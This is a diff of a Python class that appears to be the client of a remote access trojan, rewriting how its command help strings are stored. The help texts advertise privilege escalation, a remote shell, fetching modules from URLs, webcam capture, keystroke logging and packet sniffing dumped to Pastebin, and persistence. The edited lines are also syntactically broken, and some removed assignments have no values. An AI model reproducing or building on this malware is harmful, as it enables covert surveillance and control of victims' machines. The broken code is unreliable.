@@ -955,73 +955,73 @@ class Client(object):
 # ------------------ commands --------------------------
 
     @_command
-    def pwd(self): return os.getcwd()
+    def pwd(self): """usage:\t\tpwd\ndescription:\tpresent working directory""" return os.getcwd()
 
     @_command
-    def run(self): return self._run()
+    def run(self): """usage:\t\trun\ndescription:\trun enabled client modules""" return self._run()
 
     @_command
-    def kill(self): return self._kill()
+    def kill(self): """usage:\t\tkill\ndescription:\tkill client""" return self._kill()
 
     @_command
-    def cd(self, *x): return self._cd(*x)
+    def cd(self, *x): """usage:\t\tcd <path>\ndescription:\tchange directory""" return self._cd(*x)
 
     @_command
-    def set(self, x): return self._set(x)
+    def set(self, x): """usage:\t\tset <module>\ndescription:\tset module option [option]=[value]""" return self._set(x)
 
     @_command
-    def ls(self, *x): return self._ls(*x)
+    def ls(self, *x): """usage:\t\tls <path>\ndescription:\tlist directory contents""" return self._ls(*x)
 
     @_command
-    def admin(self): return self._admin()
+    def admin(self): """usage:\t\tadmin\ndescription:\tattempt to escalate privileges""" return self._admin()
     
     @_command
-    def start(self): return self._start()
+    def start(self): """usage:\t\tstart\ndescription:\tstart client""" return self._start()
     
     @_command
-    def shell(self): return self._shell()
+    def shell(self): """usage:\t\tshell\ndescription:\trun client shell """ return self._shell()
     
     @_command
-    def new(self, x): return self._new(x)
+    def new(self, x): """usage:\t\tnew <url>\ndescription:\tdownload new module from url""" return self._new(x)
 
     @_command
-    def show(self, x): return self._show(x)
+    def show(self, x): """usage:\t\tshow <option>\ndescription:\tshow client attributes""" return self._show(x)
 
     @_command
-    def standby(self): return self._standby()
+    def standby(self): """usage:\t\tstandby\ndescription:\trevert to standby mode""" return self._standby()
 
     @_command
-    def wget(self, target): return self._wget()
+    def wget(self, target): """usage:\t\twget <url>\ndescription:\tdownload file from url""" return self._wget()
 
     @_command
-    def options(self,*arg): return self._options(*arg)
+    def options(self,*arg): """usage:\t\toptions\ndescription:\tdisplay module options""" return self._options(*arg)
 
     @_command
-    def jobs(self): return self._show(self._threads)
+    def jobs(self): """usage:\t\tjobs\ndescription:\tlist currently active jobs""" return self._show(self._threads)
     
     @_command
-    def enable(self, module): return self._enable(module)
+    def enable(self, module): """usage:\t\tenable <module>\ndescription:\tenable module""" return self._enable(module)
 
     @_command
-    def disable(self, module): return self._disable(module)
+    def disable(self, module): """usage:\t\tdisable <module>\ndescription:\tdisable module""" return self._disable(module)
 
     @_command
-    def results(self): return self._show(self._result)
+    def results(self): """usage:\t\tresults\ndescription:\tshow all modules output""" return self._show(self._result)
 
     @_command
-    def help(self, *args): return self._help(args) if len(args) else self._help()
+    def help(self, *args): """usage:\t\thelp [option]\ndescription:\tshow command usage information""" return self._help(args) if len(args) else self._help()
 
     @_command
-    def info(self): return self._show(self._info)
+    def info(self): """usage:\t\tinfo\ndescription:\tget client host machine information""" return self._show(self._info)
 
     @_command
     def commands(self): """usage:\t\tcommands\ndescription:\tlist commands with usage help""" return self._help_commands 
 
     @_command
-    def modules(self): return self._help_modules 
+    def modules(self): """usage:\t\tmodules\ndescription:\tlist modules current status""" return self._help_modules 
 
     @_module
-    def webcam(self): return self._webcam()
+    def webcam(self): """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam""" return self._webcam()
     
     @_module
     def keylogger(self): """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely + dump to Pastebin""" return self._keylogger()
@@ -1034,32 +1034,6 @@ class Client(object):
     
     @_module
     def packetsniffer(self): """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic + dump to Pastebin""" return self._packetsniffer()
-
-    ls.func_doc                = """usage:\t\tls <path>\ndescription:\tlist directory contents"""
-    cd.func_doc                = """usage:\t\tcd <path>\ndescription:\tchange directory"""
-    set.func_doc               = """usage:\t\tset <module>\ndescription:\tset module option [option]=[value]"""
-    new.func_doc               = """usage:\t\tnew <url>\ndescription:\tdownload new module from url"""
-    run.func_doc               = """usage:\t\trun\ndescription:\trun enabled client modules"""
-    pwd.func_doc               = """usage:\t\tpwd\ndescription:\tpresent working directory"""
-    help.func_doc              = """usage:\t\thelp [option]\ndescription:\tshow command usage information"""
-    jobs.func_doc              = """usage:\t\tjobs\ndescription:\tlist currently active jobs"""
-    kill.func_doc              = """usage:\t\tkill\ndescription:\tkill client"""
-    show.func_doc              = """usage:\t\tshow <option>\ndescription:\tshow client attributes"""
-    wget.func_doc              = """usage:\t\twget <url>\ndescription:\tdownload file from url"""
-    admin.func_doc             = """usage:\t\tadmin\ndescription:\tattempt to escalate privileges"""
-    shell.func_doc             = """usage:\t\tshell\ndescription:\trun client shell """
-    start.func_doc             = """usage:\t\tstart\ndescription:\tstart client"""
-    webcam.func_doc            = """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam"""
-    enable.func_doc            = """usage:\t\tenable <module>\ndescription:\tenable module"""
-    standby.func_doc           = """usage:\t\tstandby\ndescription:\trevert to standby mode"""
-    options.func_doc           = """usage:\t\toptions\ndescription:\tdisplay module options"""
-    disable.func_doc           = """usage:\t\tdisable <module>\ndescription:\tdisable module"""
-    results.func_doc           = """usage:\t\tresults\ndescription:\tshow all modules output"""
-    commands.func_doc          = 
-    keylogger.func_doc         = 
-    screenshot.func_doc        = 
-    persistence.func_doc       = 
-    packetsniffer.func_doc     = 
 
 # -----------------   main   --------------------------
 
